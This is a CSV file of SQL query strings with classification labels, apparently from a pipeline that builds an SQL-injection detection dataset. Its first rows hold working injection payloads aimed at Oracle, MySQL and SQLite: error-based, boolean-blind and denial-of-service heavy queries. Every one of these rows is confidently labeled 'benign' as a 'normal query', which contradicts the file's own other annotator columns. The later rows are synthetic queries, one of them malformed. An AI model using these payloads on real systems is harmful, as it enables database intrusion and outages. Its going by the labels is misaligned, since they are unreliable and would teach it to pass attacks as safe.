payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1"" ) as uyms where 6210 = 6210 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2771,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1"" ) as uyms where 6210 = 6210 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"
1' where 6583 = 6583,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2772,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' where 6583 = 6583
"1"" or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ""bnyh"" = ""bnyh",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2773,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ""bnyh"" = ""bnyh"
"-5210"" ) where 7176 = 7176 or 6872 = 6872--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2774,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-5210"" ) where 7176 = 7176 or 6872 = 6872--"
"1' ) ) and make_set ( 1002 = 3556,3556 ) and ( ( 'mfao' = 'mfao",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2775,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1' ) ) and make_set ( 1002 = 3556,3556 ) and ( ( 'mfao' = 'mfao"
"-2583"" ) where 3455 = 3455 or make_set ( 9354 = 9354,7185 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2776,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-2583"" ) where 3455 = 3455 or make_set ( 9354 = 9354,7185 ) --"
select ( case when ( 9030 = 9185 ) then 9030 else 9030* ( select 9030 from information_schema.character_sets ) end ) #,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2777,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,select ( case when ( 9030 = 9185 ) then 9030 else 9030* ( select 9030 from information_schema.character_sets ) end ) #
"1"" ) as cxwd where 5800 = 5800 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2778,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1"" ) as cxwd where 5800 = 5800 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"1 ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2779,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )"
1'|| ( select 'bupa' from dual where 8548 = 8548,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2780,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,1'|| ( select 'bupa' from dual where 8548 = 8548
1' where 1844 = 1844,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2781,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' where 1844 = 1844
"1 ) as udjn where 6871 = 6871 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2782,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 ) as udjn where 6871 = 6871 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
"1' ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'fgox' like 'fgox",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2783,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'fgox' like 'fgox"
1 where 2672 = 2672 and 1819 = 4322#,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2784,boolean_blind,generic,Pattern match: 'and 1819 = 4322' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 where 2672 = 2672 and 1819 = 4322#
-5861' ) or 1581 = 2611 and ( 'mvjh' like 'mvjh,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2785,boolean_blind,generic,Pattern match: 'or 1581 = 2611' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-5861' ) or 1581 = 2611 and ( 'mvjh' like 'mvjh
"1' in boolean mode ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2786,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1' in boolean mode ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) #"
"select * from generate_series ( 3827,3827,case when ( 3827 = 7095 ) then 1 else 0 end ) limit 1--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2787,boolean_blind,postgresql,generic SQL keywords without specific signal,boolean_blind,postgresql,generic SQL structure without strong signal,"select * from generate_series ( 3827,3827,case when ( 3827 = 7095 ) then 1 else 0 end ) limit 1--"
SELECT * FROM if WHERE cage = military,benign,generic,1.0,"Simple SELECT with WHERE - normal SQL query, not attack",KEEP,,benign,generic,2788,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,SELECT * FROM if WHERE cage = military
SELECT * FROM greatest WHERE tank = 'grow' AND City = 'upper',benign,generic,1.0,SELECT with AND conditions - normal SQL query,KEEP,,benign,generic,2789,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,SELECT * FROM greatest WHERE tank = 'grow' AND City = 'upper'
SELECT * FROM energy WHERE alive = 'arm' OR cross = 'track',benign,generic,1.0,SELECT with OR conditions - normal SQL query,KEEP,,benign,generic,2790,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,SELECT * FROM energy WHERE alive = 'arm' OR cross = 'track'
SELECT * FROM forget WHERE compass = 'roof' OR put = 'mother',benign,generic,1.0,SELECT with OR conditions - normal SQL query,KEEP,,benign,generic,2791,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,SELECT * FROM forget WHERE compass = 'roof' OR put = 'mother'
SELECT * FROM hungry WHERE NOT volume = 'run',benign,generic,1.0,SELECT with NOT condition - normal SQL query,KEEP,,benign,generic,2792,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,SELECT * FROM hungry WHERE NOT volume = 'run'
SELECT * FROM iron WHERE supply = 'least' AND ( advice = 'lot' OR party = 'potatoes' ),benign,generic,1.0,SELECT with AND and OR - normal SQL query,KEEP,,benign,generic,2793,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,SELECT * FROM iron WHERE supply = 'least' AND ( advice = 'lot' OR party = 'potatoes' )
SELECT * FROM laid WHERE NOT further = 'accident' AND NOT perhaps = 'cup',benign,generic,1.0,SELECT with NOT conditions - normal SQL query,KEEP,,benign,generic,2794,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,SELECT * FROM laid WHERE NOT further = 'accident' AND NOT perhaps = 'cup'
SELECT * FROM art ORDER BY perfectly,benign,generic,1.0,SELECT with ORDER BY - normal SQL query,KEEP,,benign,generic,2795,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,SELECT * FROM art ORDER BY perfectly
SELECT * FROM front ORDER BY pattern DESC,benign,generic,1.0,SELECT with ORDER BY DESC - normal SQL query,KEEP,,benign,generic,2796,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,SELECT * FROM front ORDER BY pattern DESC
"SELECT * FROM gold ORDER BY bicycle, nation",benign,generic,1.0,SELECT with ORDER BY multiple columns - normal SQL query,KEEP,,benign,generic,2797,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"SELECT * FROM gold ORDER BY bicycle, nation"
"SELECT * FROM around ORDER BY popular ASC, than DESC",benign,generic,1.0,SELECT with ORDER BY ASC/DESC - normal SQL query,KEEP,,benign,generic,2798,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"SELECT * FROM around ORDER BY popular ASC, than DESC"
"INSERT INTO baseball ( wrote, shall, your, half, rabbit, party ) VALUES ( 'meal', 'ranch'. dead', 'engineer', 'steep', 'unusual', 'service' )",benign,generic,1.0,INSERT with VALUES - normal SQL DML statement,KEEP,,benign,generic,2799,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"INSERT INTO baseball ( wrote, shall, your, half, rabbit, party ) VALUES ( 'meal', 'ranch'. dead', 'engineer', 'steep', 'unusual', 'service' )"
